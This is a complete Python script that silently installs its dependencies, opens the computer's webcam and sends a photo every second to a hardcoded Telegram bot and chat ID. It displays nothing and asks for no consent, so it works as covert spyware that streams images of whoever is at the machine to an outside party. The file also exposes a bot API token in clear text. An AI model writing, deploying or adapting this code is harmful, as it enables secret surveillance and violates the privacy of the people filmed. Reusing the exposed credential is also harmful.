import cv2
import requests
import numpy as np
import time
import os

os.system('pip install opencv-python')
os.system('pip install requests')
os.system('pip install opencv-python-headless')


# Telegram Bot API token
TOKEN = '7135600941:AAFd6-m2E8BzPXHB-z6nIESnBYNbuwiDD8Q'

# Chat ID of the recipient (can be a group chat ID or a user ID)
chat_id = '1406652305'


# Function to capture and send live images
def send_live_images():
    # Open the webcam (you may need to change the index if you have multiple cameras)
    cap = cv2.VideoCapture(0)
    
    while True:
        # Capture frame-by-frame
        ret, frame = cap.read()

        # Convert frame to JPEG format
        _, img_encoded = cv2.imencode('.jpg', frame)

        # Convert JPEG image to bytes
        img_bytes = img_encoded.tobytes()

        # URL of the Telegram Bot API endpoint for sending photos
        url = f'https://api.telegram.org/bot{TOKEN}/sendPhoto'

        # Prepare the data to be sent
        files = {'photo': ('image.jpg', img_bytes)}
        data = {'chat_id': chat_id}

        # Send the photo
        response = requests.post(url, files=files, data=data)

        # Check the response
        if response.status_code != 200:
            print(f"Failed to send image. Error {response.status_code}: {response.text}")

        # Wait for a short interval before capturing the next frame
        time.sleep(1)

    # Release the webcam and close the window when finished
    cap.release()
    cv2.destroyAllWindows()

# Call the function to start sending live images
send_live_images()

